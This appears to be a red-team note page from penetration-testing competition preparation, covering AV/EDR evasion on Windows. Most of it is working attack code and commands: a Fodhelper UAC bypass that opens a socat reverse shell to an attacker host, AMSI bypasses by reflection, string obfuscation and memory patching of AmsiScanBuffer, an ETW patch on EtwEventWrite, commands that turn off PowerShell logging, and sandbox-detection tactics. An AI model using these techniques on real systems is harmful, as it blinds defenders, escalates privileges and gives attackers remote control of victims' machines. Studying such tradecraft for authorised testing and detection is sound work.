AV/EDR Evasion is an arms race that is mostly beyond the scope of CPTC. However, it is very useful to have evasive tools readily deployed to assist in less permissive environments. Our OPSEC is important, especially in a Red Team environment. 

# Shellcode

>[!note]
>Your shellcode should already be generated to use the below tools save MSFVenom. Use the note at [[Shellcode]] to construct your shellcode before using these techniques.

- [[ScareCrow]]
- [[Pestilence]]
- [[Shellter]]
- [[Veil]]
- [[MSFVenom]] options
- Encoding
	- Encoding a payload is unlikely to defeat a scanner worth its salt. 
- Encrypting
	- Encryption is a much more reliable technique, but MSFVenom is well signatured no matter what you do with it. [[ScareCrow]] is a better option here, or [[Pestilence]]. 
- Staging payloads
- Waiting
	- Sometimes, waiting 5 minutes before sending a command can allow an in-memory scanner to move on from examining your malicious payload before it actually executes any malicious commands. This is sometimes the case with Defender as the HTH team can attest to.
- Binding
	- Bind malicious shellcode to a normal executable. Best used after other evasion techniques for [[Persistence]]. This is less of an AV evasion technique than a user-interaction evasion technique.

# Custom Executables and Loaders
- Splitting and Merging Objects
	- If strings or other character/byte arrays are triggering AMSI, you can split them up. Use [[AMSITrigger]] to determine when your code has been properly obfuscated.
	- Use a splitting technique with [[ThreatCheck]] or similar to determine where the byte signatures are in compiled executables that are triggering Defender and/or AMSI to mitigate them.
- Obfuscating Imports
	- Use code similar to below to obfuscate potentially indicative calls to Windows API functions from EDR/XDR. Notably, this does not exclude these DLLs from the IAT, but will avoid using them in a suspicious manner during execution, which is what AMSI will look for.
```c++
#include <windows.h>
#include <stdio.h>
#include <lm.h>

typedef BOOL (WINAPI* doSomething)(
        LPSTR   lpBuffer,
        LPDWORD nSize
);

HMODULE hkernel32 = LoadLibraryA("kernel32.dll");

doSomething something = (doSomething) GetProcAddress(hkernel32, "GetComputerNameA");

int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (something(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

# User Account Control
This deserved its own TryHackMe room, so I'm separating it out here. 

### GUI Bypasses
MSConfig always runs as a High-IL process and has a "tool" allowing us to launch a command prompt, allowing us to bypass UAC completely. 
AZMan has a "Help Topics" page with a view-source option. Once notepad opens click Open, and navigate to cmd.exe. Right-click->Open and you have a High-IL shell. 

### Using Fodhelper to Bypass without a GUI
The Fodhelper binary has auto-elevate properties that can be used to obtain a High-IL shell without relying on GUI interaction. 
```powershell
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden <socat binary> TCP:<attacker_ip>:<attacker port> EXEC:cmd.exe,pipes" # Command can be something else. This establishes a reverse shell with SOCAT
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f

fodhelper.exe

reg delete HKCU\Software\Classes\ms-settings\ /f # Post-compromise cleanup

# The below code more reliably bypasses Windows Defender. Some trivial obfuscation may be necessary.

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:<attacker port> EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.ccu\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".ccu" /f

```

An automated solution to UAC bypasses can be found here: https://github.com/hfiref0x/UACME

# Maldocs
Maldocs refers to malicious documents created in Office or other applications capable of running code from macros. 

- [[MacroPack]]
- [[OfficePurge]]

# Powershell
Powershell can be masked from AMSI using several methods.
- Powershell Downgrade
	- Powershell V2.0 does not use AMSI instrumentation at all. It's that simple.
```powershell
powershell.exe -Version 2 # Haha get juked
```
- Powershell Reflection
	- AMSIUtils can be used to set the value of "amsiInitFailed" in the binary itself, convincing AMSI that it is not running and therefore cannot detect anything. 
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) # Gaslight the system
```
- String Concatenation
	- If a string is broken up, it is stored in different places in memory, try not to keep any keywords together. Use [[AMSITrigger]] to detect locations. 
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Becomes

[Ref].Assembly.gETTyPE('Sy' +'tem' +'.Ma' + 'nagemen' + 't.a' + 'utomation.' + 'ams' + 'iuTils'.getFIELD('am' + 'siIn' + 'itFail' + 'ed', 'NonPublic,Static').setvaluE($null,$true) 
```
- Arbitrary Capitalization manipulation
	- Change how cmdlets are capitalized to help evade rules-based detections.
- Reorder components
- Random amounts of uninterpreted whitespace
- Uninterpreted ticks.
- Patch AMSI
	- Hot-patching AMSI to accept anything is a valid option. Since AMSI is running with the same privileges as our process, we can just hot-patch a "don't trigger" over the "trigger" part of the binary. 
```powershell

# This code will need to be obfuscated.

$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer');
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

Automated solutions include [[Amsi.fail]]

# Sandbox Evasion

A sandbox is a temporary test machine used to track your application's actions on its target to determine if they are malicious. However, we can detect if we are running in a sandbox and wait to execute our malicious code until we are running on our actual target machine. 

There are a few ways to determine if your application is running in a sandbox. 
1. Sleep Check
	- Wait out the sandbox execution. If the sandbox does not determine anything malicious about the binary in the first two minutes it may determine the binary is safe to run. 
2. Geolocation Check
	- If the binary is running in a location it was not meant for, it is likely running in a sandbox. This especially applies to when you find out it is running in California or similar. 
3. System Information Check
	- Sandbox environments are resource-constrained. If the machine you are running in has only one CPU, it is highly likely it is running in a sandbox. The sandbox likely does not have the user accounts you are targeting. A sandbox will not match your target system. Use this to your advantage. 
4. Network Information Check
	- A sandbox is likely not joined to the same domain you are targeting. A sandbox likely does not have the same group of Domain Administrators as your target machine. 

# Logging
Evading logging solutions is much harder than evading EDR/XDR detection generally. However, it takes an analyst to find what a computer could not. Example of logging solutions include [[syslog]] and [[ETW]], while these logs can be immediately transferred elsewhere using enterprise collection software like [[Splunk]] or [[Elastic Stack]].

ETW will be our main enemy in this section.

ETW is split into Controllers, Providers, and Consumers. 
- Controllers - Build and configure event tracing sessions.
- Providers - Generate events to these sessions.
- Consumers - Interpret the events they are receiving. 

Patching ETW on-the-fly can be accomplished to avoid detection. By replacing the call to `EtwEventWrite` at its base address with a `ret 14h` we can totally negate the function call altogether. The necessary code can be found below. 

```c#
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");

uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);

patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);

VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);

Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

We can also abuse the log pipeline itself to avoid detection.

```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```

We can also use our Powershell session to modify the Group Policy settings with respect to our session.  

```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

Note that these measures must bypass antivirus when they are used. Apply already discussed obfuscation techniques to get your logging avoidance solutions through AMSI. 
